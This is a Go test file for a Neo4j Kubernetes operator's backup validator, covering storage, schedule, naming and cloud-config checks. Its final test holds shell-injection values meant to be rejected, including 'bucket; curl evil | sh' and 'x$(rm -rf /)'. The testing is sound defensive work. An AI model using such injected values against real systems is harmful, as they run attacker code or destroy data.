/*
Copyright 2025 Priyo Lahiri.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package validation

import (
	"strings"
	"testing"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/utils/ptr"

	neo4jv1beta1 "github.com/priyolahiri/neo4j-kubernetes-operator/api/v1beta1"
)

func TestBackupValidator_Validate(t *testing.T) {
	validator := NewBackupValidator()

	tests := []struct {
		name        string
		backup      *neo4jv1beta1.Neo4jBackup
		expectError bool
		errorCount  int
		// expectedErrorContains lists message fragments. For each entry,
		// at least one returned validation error must contain that
		// substring (independent matches — one error can satisfy multiple
		// entries, but each entry must hit at least one error). Counting
		// errors alone doesn't tell you WHICH validator fired; pinning
		// fragments catches regressions where two different validators
		// happen to fire to produce the same total count.
		//
		// Multi-entry usage is for cases like "invalid target kind"
		// where a single CR is designed to trip TWO validators
		// simultaneously — each substring asserts a distinct expected
		// failure mode, so a regression that drops one of them surfaces
		// instead of being absorbed into the count.
		expectedErrorContains []string
	}{
		{
			name: "valid cluster backup to S3",
			backup: &neo4jv1beta1.Neo4jBackup{
				ObjectMeta: metav1.ObjectMeta{
					Name: "test-backup",
				},
				Spec: neo4jv1beta1.Neo4jBackupSpec{
					Target: neo4jv1beta1.BackupTarget{
						Kind: "Cluster",
						Name: "test-cluster",
					},
					Storage: neo4jv1beta1.StorageLocation{
						Type:   "s3",
						Bucket: "backup-bucket",
						Path:   "neo4j-backups",
						Cloud: &neo4jv1beta1.CloudBlock{
							Provider: "aws",
						},
					},
					Schedule: "0 2 * * *", // Daily at 2 AM
				},
			},
			expectError: false,
			errorCount:  0,
		},
		{
			name: "valid database backup to GCS",
			backup: &neo4jv1beta1.Neo4jBackup{
				ObjectMeta: metav1.ObjectMeta{
					Name: "test-backup",
				},
				Spec: neo4jv1beta1.Neo4jBackupSpec{
					Target: neo4jv1beta1.BackupTarget{
						Kind:       "Database",
						Name:       "test-database",
						ClusterRef: "test-cluster",
					},
					Storage: neo4jv1beta1.StorageLocation{
						Type:   "gcs",
						Bucket: "backup-bucket",
						Path:   "neo4j-backups",
						Cloud: &neo4jv1beta1.CloudBlock{
							Provider: "gcp",
						},
					},
				},
			},
			expectError: false,
			errorCount:  0,
		},
		{
			name: "invalid target kind",
			backup: &neo4jv1beta1.Neo4jBackup{
				ObjectMeta: metav1.ObjectMeta{
					Name: "test-backup",
				},
				Spec: neo4jv1beta1.Neo4jBackupSpec{
					Target: neo4jv1beta1.BackupTarget{
						Kind: "InvalidKind",
						Name: "test-target",
					},
					Storage: neo4jv1beta1.StorageLocation{
						Type:   "s3",
						Bucket: "backup-bucket",
					},
				},
			},
			expectError: true,
			errorCount:  2,
			// Both validators MUST fire — invalid `target.kind` AND the
			// S3 storage requiring a cloud block. The count alone could
			// be satisfied by any two errors; pinning one fragment per
			// expected validator catches a regression that swaps either
			// firing site for an unrelated one and still produces 2.
			expectedErrorContains: []string{
				"target.kind", // field.NotSupported on Spec.Target.Kind
				"cloud",       // S3 storage requires cloud provider
			},
		},
		{
			name: "missing target name",
			backup: &neo4jv1beta1.Neo4jBackup{
				ObjectMeta: metav1.ObjectMeta{
					Name: "test-backup",
				},
				Spec: neo4jv1beta1.Neo4jBackupSpec{
					Target: neo4jv1beta1.BackupTarget{
						Kind: "Cluster",
						// Missing name
					},
					Storage: neo4jv1beta1.StorageLocation{
						Type: "pvc",
						PVC: &neo4jv1beta1.PVCSpec{
							Name: "backup-pvc",
						},
					},
				},
			},
			expectError: true,
			errorCount:  1,
		},
		{
			name: "invalid storage type",
			backup: &neo4jv1beta1.Neo4jBackup{
				ObjectMeta: metav1.ObjectMeta{
					Name: "test-backup",
				},
				Spec: neo4jv1beta1.Neo4jBackupSpec{
					Target: neo4jv1beta1.BackupTarget{
						Kind: "Cluster",
						Name: "test-cluster",
					},
					Storage: neo4jv1beta1.StorageLocation{
						Type: "invalid-type",
					},
				},
			},
			expectError: true,
			errorCount:  1,
		},
		{
			name: "PVC storage with empty pvc.name is rejected",
			backup: &neo4jv1beta1.Neo4jBackup{
				ObjectMeta: metav1.ObjectMeta{Name: "test-backup"},
				Spec: neo4jv1beta1.Neo4jBackupSpec{
					Target: neo4jv1beta1.BackupTarget{Kind: "Cluster", Name: "test-cluster"},
					Storage: neo4jv1beta1.StorageLocation{
						Type: "pvc",
						PVC:  &neo4jv1beta1.PVCSpec{}, // PVCSpec set but Name is empty
					},
				},
			},
			// Without a PVC name, /backup in the Pod is an EmptyDir;
			// the backup "succeeds" but artifacts are discarded when
			// the Job's TTL elapses (matches the validator's error text).
			expectError:           true,
			errorCount:            1,
			expectedErrorContains: []string{"spec.storage.pvc.name"},
		},
		{
			name: "PVC storage with whitespace-only pvc.name is rejected",
			backup: &neo4jv1beta1.Neo4jBackup{
				ObjectMeta: metav1.ObjectMeta{Name: "test-backup"},
				Spec: neo4jv1beta1.Neo4jBackupSpec{
					Target: neo4jv1beta1.BackupTarget{Kind: "Cluster", Name: "test-cluster"},
					Storage: neo4jv1beta1.StorageLocation{
						Type: "pvc",
						// "   " would slip past a naive == "" check; the
						// validator trims first so K8s never sees a
						// malformed PVC name and the user gets a clear
						// rejection at apply time, not a Pod
						// MountVolume.SetUp failure later.
						PVC: &neo4jv1beta1.PVCSpec{Name: "   "},
					},
				},
			},
			expectError:           true,
			errorCount:            1,
			expectedErrorContains: []string{"spec.storage.pvc.name"},
		},
		{
			name: "PVC storage with nil PVC is rejected",
			backup: &neo4jv1beta1.Neo4jBackup{
				ObjectMeta: metav1.ObjectMeta{Name: "test-backup"},
				Spec: neo4jv1beta1.Neo4jBackupSpec{
					Target:  neo4jv1beta1.BackupTarget{Kind: "Cluster", Name: "test-cluster"},
					Storage: neo4jv1beta1.StorageLocation{Type: "pvc"}, // no PVC block at all
				},
			},
			expectError:           true,
			errorCount:            1,
			expectedErrorContains: []string{"spec.storage.pvc"},
		},
		{
			name: "S3 without cloud provider",
			backup: &neo4jv1beta1.Neo4jBackup{
				ObjectMeta: metav1.ObjectMeta{
					Name: "test-backup",
				},
				Spec: neo4jv1beta1.Neo4jBackupSpec{
					Target: neo4jv1beta1.BackupTarget{
						Kind: "Cluster",
						Name: "test-cluster",
					},
					Storage: neo4jv1beta1.StorageLocation{
						Type:   "s3",
						Bucket: "backup-bucket",
						// Missing Cloud configuration
					},
				},
			},
			expectError:           true,
			errorCount:            1,
			expectedErrorContains: []string{"cloud"},
		},
		{
			name: "invalid cron schedule",
			backup: &neo4jv1beta1.Neo4jBackup{
				ObjectMeta: metav1.ObjectMeta{
					Name: "test-backup",
				},
				Spec: neo4jv1beta1.Neo4jBackupSpec{
					Target: neo4jv1beta1.BackupTarget{
						Kind: "Cluster",
						Name: "test-cluster",
					},
					Storage: neo4jv1beta1.StorageLocation{
						Type:   "s3",
						Bucket: "backup-bucket",
						Cloud: &neo4jv1beta1.CloudBlock{
							Provider: "aws",
						},
					},
					Schedule: "invalid-cron",
				},
			},
			expectError: true,
			errorCount:  1,
			// Pin the message fragment to prove validateSchedule is the
			// validator firing — without this, a regression where some
			// other check happens to produce one error would silently
			// pass on the wrong assertion.
			expectedErrorContains: []string{"cron schedule"},
		},
		{
			name: "valid backup with compress and verify",
			backup: &neo4jv1beta1.Neo4jBackup{
				ObjectMeta: metav1.ObjectMeta{
					Name: "test-backup",
				},
				Spec: neo4jv1beta1.Neo4jBackupSpec{
					Target: neo4jv1beta1.BackupTarget{
						Kind: "Cluster",
						Name: "test-cluster",
					},
					Storage: neo4jv1beta1.StorageLocation{
						Type:   "s3",
						Bucket: "backup-bucket",
						Cloud: &neo4jv1beta1.CloudBlock{
							Provider: "aws",
						},
					},
					Options: &neo4jv1beta1.BackupOptions{
						Compress: ptr.To(true),
					},
				},
			},
			expectError: false,
			errorCount:  0,
		},
		{
			name: "valid PVC backup",
			backup: &neo4jv1beta1.Neo4jBackup{
				ObjectMeta: metav1.ObjectMeta{
					Name: "test-backup",
				},
				Spec: neo4jv1beta1.Neo4jBackupSpec{
					Target: neo4jv1beta1.BackupTarget{
						Kind: "Cluster",
						Name: "test-cluster",
					},
					Storage: neo4jv1beta1.StorageLocation{
						Type: "pvc",
						PVC: &neo4jv1beta1.PVCSpec{
							Name: "backup-pvc",
						},
					},
				},
			},
			expectError: false,
			errorCount:  0,
		},
		{
			name: "valid sharded database backup",
			backup: &neo4jv1beta1.Neo4jBackup{
				ObjectMeta: metav1.ObjectMeta{Name: "test-backup", Namespace: "default"},
				Spec: neo4jv1beta1.Neo4jBackupSpec{
					Target: neo4jv1beta1.BackupTarget{
						Kind:       "ShardedDatabase",
						Name:       "products",
						ClusterRef: "my-cluster",
					},
					Storage: neo4jv1beta1.StorageLocation{
						Type: "pvc",
						PVC:  &neo4jv1beta1.PVCSpec{Name: "backup-pvc"},
					},
				},
			},
			expectError: false,
			errorCount:  0,
		},
		{
			name: "ShardedDatabase missing clusterRef",
			backup: &neo4jv1beta1.Neo4jBackup{
				ObjectMeta: metav1.ObjectMeta{Name: "test-backup", Namespace: "default"},
				Spec: neo4jv1beta1.Neo4jBackupSpec{
					Target: neo4jv1beta1.BackupTarget{
						Kind: "ShardedDatabase",
						Name: "products",
					},
					Storage: neo4jv1beta1.StorageLocation{
						Type: "pvc",
						PVC:  &neo4jv1beta1.PVCSpec{Name: "backup-pvc"},
					},
				},
			},
			expectError:           true,
			errorCount:            1,
			expectedErrorContains: []string{"clusterRef is required when target.kind=ShardedDatabase"},
		},
		{
			name: "ShardedDatabase with cross-namespace target.namespace",
			backup: &neo4jv1beta1.Neo4jBackup{
				ObjectMeta: metav1.ObjectMeta{Name: "test-backup", Namespace: "default"},
				Spec: neo4jv1beta1.Neo4jBackupSpec{
					Target: neo4jv1beta1.BackupTarget{
						Kind:       "ShardedDatabase",
						Name:       "products",
						ClusterRef: "my-cluster",
						Namespace:  "other-ns",
					},
					Storage: neo4jv1beta1.StorageLocation{
						Type: "pvc",
						PVC:  &neo4jv1beta1.PVCSpec{Name: "backup-pvc"},
					},
				},
			},
			expectError:           true,
			errorCount:            1,
			expectedErrorContains: []string{"cross-namespace target references are not supported"},
		},
		{
			name: "Cluster with cross-namespace target.namespace is rejected",
			backup: &neo4jv1beta1.Neo4jBackup{
				ObjectMeta: metav1.ObjectMeta{Name: "test-backup", Namespace: "default"},
				Spec: neo4jv1beta1.Neo4jBackupSpec{
					Target: neo4jv1beta1.BackupTarget{
						Kind:      "Cluster",
						Name:      "my-cluster",
						Namespace: "other-ns",
					},
					Storage: neo4jv1beta1.StorageLocation{
						Type: "pvc",
						PVC:  &neo4jv1beta1.PVCSpec{Name: "backup-pvc"},
					},
				},
			},
			expectError:           true,
			errorCount:            1,
			expectedErrorContains: []string{"cross-namespace target references are not supported"},
		},
		{
			name: "ShardedDatabase with matching target.namespace allowed",
			backup: &neo4jv1beta1.Neo4jBackup{
				ObjectMeta: metav1.ObjectMeta{Name: "test-backup", Namespace: "default"},
				Spec: neo4jv1beta1.Neo4jBackupSpec{
					Target: neo4jv1beta1.BackupTarget{
						Kind:       "ShardedDatabase",
						Name:       "products",
						ClusterRef: "my-cluster",
						Namespace:  "default", // same as backup ns
					},
					Storage: neo4jv1beta1.StorageLocation{
						Type: "pvc",
						PVC:  &neo4jv1beta1.PVCSpec{Name: "backup-pvc"},
					},
				},
			},
			expectError: false,
			errorCount:  0,
		},
		{
			// 41 chars + a schedule → generated CronJob "<name>-backup-cron"
			// is 53 chars, over Kubernetes' 52-char CronJob name limit.
			name: "scheduled backup name too long for CronJob",
			backup: &neo4jv1beta1.Neo4jBackup{
				ObjectMeta: metav1.ObjectMeta{Name: strings.Repeat("a", 41)},
				Spec: neo4jv1beta1.Neo4jBackupSpec{
					Target: neo4jv1beta1.BackupTarget{Kind: "Cluster", Name: "test-cluster"},
					Storage: neo4jv1beta1.StorageLocation{
						Type: "pvc",
						PVC:  &neo4jv1beta1.PVCSpec{Name: "backup-pvc"},
					},
					Schedule: "0 2 * * *",
				},
			},
			expectError:           true,
			errorCount:            1,
			expectedErrorContains: []string{"metadata.name", "52-character CronJob"},
		},
		{
			// 41 chars at the boundary is fine for a one-shot backup — the
			// CronJob-name limit only applies when a schedule is set.
			name: "long name without schedule is allowed (one-shot)",
			backup: &neo4jv1beta1.Neo4jBackup{
				ObjectMeta: metav1.ObjectMeta{Name: strings.Repeat("a", 41)},
				Spec: neo4jv1beta1.Neo4jBackupSpec{
					Target: neo4jv1beta1.BackupTarget{Kind: "Cluster", Name: "test-cluster"},
					Storage: neo4jv1beta1.StorageLocation{
						Type: "pvc",
						PVC:  &neo4jv1beta1.PVCSpec{Name: "backup-pvc"},
					},
				},
			},
			expectError: false,
			errorCount:  0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			errors := validator.Validate(tt.backup)

			if tt.expectError {
				if len(errors) == 0 {
					t.Errorf("expected validation errors but got none")
				}
				if len(errors) != tt.errorCount {
					t.Errorf("expected %d errors but got %d: %v", tt.errorCount, len(errors), errors)
				}
				// Each expected fragment must appear in at least one error.
				// One error can satisfy multiple fragments, but every
				// fragment must hit — so dropping any of the expected
				// validators fails the test.
				for _, want := range tt.expectedErrorContains {
					found := false
					for _, err := range errors {
						if strings.Contains(err.Error(), want) {
							found = true
							break
						}
					}
					if !found {
						t.Errorf("expected an error containing %q but got: %v", want, errors)
					}
				}
			} else if len(errors) > 0 {
				t.Errorf("expected no validation errors but got %d: %v", len(errors), errors)
			}
		})
	}
}

func TestBackupValidator_validateStorageType(t *testing.T) {
	validator := NewBackupValidator()

	tests := []struct {
		name        string
		storageType string
		expectError bool
	}{
		{
			name:        "valid S3 type",
			storageType: "s3",
			expectError: false,
		},
		{
			name:        "valid GCS type",
			storageType: "gcs",
			expectError: false,
		},
		{
			name:        "valid Azure type",
			storageType: "azure",
			expectError: false,
		},
		{
			name:        "valid PVC type",
			storageType: "pvc",
			expectError: false,
		},
		{
			name:        "invalid type",
			storageType: "invalid-type",
			expectError: true,
		},
		{
			name:        "empty type",
			storageType: "",
			expectError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.validateStorageType(tt.storageType)

			if tt.expectError {
				if err == nil {
					t.Errorf("expected error but got none")
				}
			} else {
				if err != nil {
					t.Errorf("expected no error but got: %v", err)
				}
			}
		})
	}
}

func TestValidateScheduledBackupName(t *testing.T) {
	cases := []struct {
		name      string
		input     string
		expectErr bool
	}{
		{"boundary 40 chars ok", strings.Repeat("a", 40), false},
		{"41 chars rejected", strings.Repeat("a", 41), true},
		{"typical short name ok", "nightly-backup", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateScheduledBackupName(tc.input)
			if tc.expectErr && err == nil {
				t.Fatalf("expected an error for a %d-char name", len(tc.input))
			}
			if !tc.expectErr && err != nil {
				t.Fatalf("unexpected error for a %d-char name: %v", len(tc.input), err)
			}
			if tc.expectErr && !strings.Contains(err.Error(), "52-character CronJob") {
				t.Errorf("error message should explain the CronJob limit, got: %v", err)
			}
		})
	}
}

func TestValidateSchedule(t *testing.T) {
	v := &BackupValidator{}
	cases := []struct {
		schedule  string
		expectErr bool
	}{
		{"0 2 * * *", false},          // standard 5-field
		{"0,30 * * * *", false},       // comma list (was wrongly rejected before)
		{"0 9-17 * * MON-FRI", false}, // range + named days
		{"*/15 * * * *", false},       // step
		{"@daily", false},             // macro
		{"0 0 2 * * *", true},         // 6-field — K8s CronJob rejects (was wrongly accepted before)
		{"* * * *", true},             // 4-field
		{"not-a-cron", true},
		// Timezone-embedded schedules parse in robfig/cron but Kubernetes
		// rejects them in CronJob.spec.schedule — reject up front.
		{"CRON_TZ=UTC 0 0 * * *", true},
		{"TZ=America/New_York 0 0 * * *", true},
		{"", true}, // empty → error (and must not panic; validateSchedule recovers)
	}
	for _, tc := range cases {
		t.Run(tc.schedule, func(t *testing.T) {
			err := v.validateSchedule(tc.schedule)
			if tc.expectErr && err == nil {
				t.Fatalf("expected error for schedule %q", tc.schedule)
			}
			if !tc.expectErr && err != nil {
				t.Fatalf("unexpected error for schedule %q: %v", tc.schedule, err)
			}
		})
	}
}

func TestIsValidMaxAge(t *testing.T) {
	cases := []struct {
		in   string
		want bool
	}{
		{"7d", true}, // runtime shorthand — time.ParseDuration rejects this
		{"30d", true},
		{"24h", true},
		{"90m", true},
		{"45s", true},
		{"1h30m", false}, // compound durations rejected — parseFindTimeArg can't apply them (#227 item 8)
		{"1.5h", false},  // fractional Go duration — same reason
		{"7days", false},
		{"0d", false},
		{"abc", false},
		{"", false},
	}
	for _, tc := range cases {
		t.Run(tc.in, func(t *testing.T) {
			if got := isValidMaxAge(tc.in); got != tc.want {
				t.Errorf("isValidMaxAge(%q) = %v, want %v", tc.in, got, tc.want)
			}
		})
	}
}

// TestBackupValidator_CloudAtSpecLevel pins the fix for the regression that
// surfaced when BackupValidator was wired into the reconciler: cloud config
// commonly lives at the top-level spec.cloud (not nested under spec.storage.cloud),
// and the reconciler resolves storage.cloud ?? spec.cloud. The validator must
// accept a cloud backup whose provider is set only at spec.cloud.
func TestBackupValidator_CloudAtSpecLevel(t *testing.T) {
	v := NewBackupValidator()
	backup := &neo4jv1beta1.Neo4jBackup{
		ObjectMeta: metav1.ObjectMeta{Name: "test-backup"},
		Spec: neo4jv1beta1.Neo4jBackupSpec{
			Target:  neo4jv1beta1.BackupTarget{Kind: "Cluster", Name: "test-cluster"},
			Storage: neo4jv1beta1.StorageLocation{Type: "s3", Bucket: "test-bucket"}, // no nested storage.cloud
			Cloud:   &neo4jv1beta1.CloudBlock{Provider: "aws"},                       // provider only at spec.cloud
		},
	}
	if errs := v.Validate(backup); len(errs) != 0 {
		t.Errorf("expected no errors for S3 backup with provider at spec.cloud, got: %v", errs)
	}

	// And it still rejects when neither spec.cloud nor storage.cloud has a provider.
	backup.Spec.Cloud = nil
	if errs := v.Validate(backup); len(errs) == 0 {
		t.Error("expected an error for S3 backup with no cloud provider anywhere")
	}
}

// TestBackupValidator_ShellSafetyCharsets pins #219: fields that reach the
// backup Job's /bin/sh -c command are rejected up front when they carry shell
// metacharacters (the command builder also quotes them — defense-in-depth).
func TestBackupValidator_ShellSafetyCharsets(t *testing.T) {
	validator := NewBackupValidator()
	base := func() *neo4jv1beta1.Neo4jBackup {
		return &neo4jv1beta1.Neo4jBackup{
			ObjectMeta: metav1.ObjectMeta{Name: "b", Namespace: "ns"},
			Spec: neo4jv1beta1.Neo4jBackupSpec{
				Target:  neo4jv1beta1.BackupTarget{Kind: "Cluster", Name: "c"},
				Storage: neo4jv1beta1.StorageLocation{Type: "s3", Bucket: "my-bucket", Path: "backups/prod"},
				Cloud:   &neo4jv1beta1.CloudBlock{Provider: "aws"},
			},
		}
	}

	t.Run("clean spec passes", func(t *testing.T) {
		if errs := validator.Validate(base()); len(errs) != 0 {
			t.Fatalf("expected no errors, got %v", errs)
		}
	})

	t.Run("bucket with metacharacters rejected", func(t *testing.T) {
		b := base()
		b.Spec.Storage.Bucket = "bucket; curl evil | sh"
		if errs := validator.Validate(b); len(errs) == 0 {
			t.Fatal("expected bucket charset rejection")
		}
	})

	t.Run("path with command substitution rejected", func(t *testing.T) {
		b := base()
		b.Spec.Storage.Path = "x$(rm -rf /)"
		if errs := validator.Validate(b); len(errs) == 0 {
			t.Fatal("expected path charset rejection")
		}
	})

	t.Run("tempPath must be absolute and clean", func(t *testing.T) {
		b := base()
		b.Spec.Options = &neo4jv1beta1.BackupOptions{TempPath: "/tmp/ok-dir_1"}
		if errs := validator.Validate(b); len(errs) != 0 {
			t.Fatalf("clean absolute tempPath must pass, got %v", errs)
		}
		b.Spec.Options.TempPath = "relative/path"
		if errs := validator.Validate(b); len(errs) == 0 {
			t.Fatal("relative tempPath must be rejected")
		}
		b.Spec.Options.TempPath = "/tmp/x;evil"
		if errs := validator.Validate(b); len(errs) == 0 {
			t.Fatal("metacharacter tempPath must be rejected")
		}
	})

	t.Run("chainFromBackup must be a resource name", func(t *testing.T) {
		b := base()
		b.Spec.ChainFromBackup = "daily-full"
		if errs := validator.Validate(b); len(errs) != 0 {
			t.Fatalf("valid chainFromBackup must pass, got %v", errs)
		}
		b.Spec.ChainFromBackup = "x; touch /tmp/pwned"
		if errs := validator.Validate(b); len(errs) == 0 {
			t.Fatal("metacharacter chainFromBackup must be rejected")
		}
	})
}
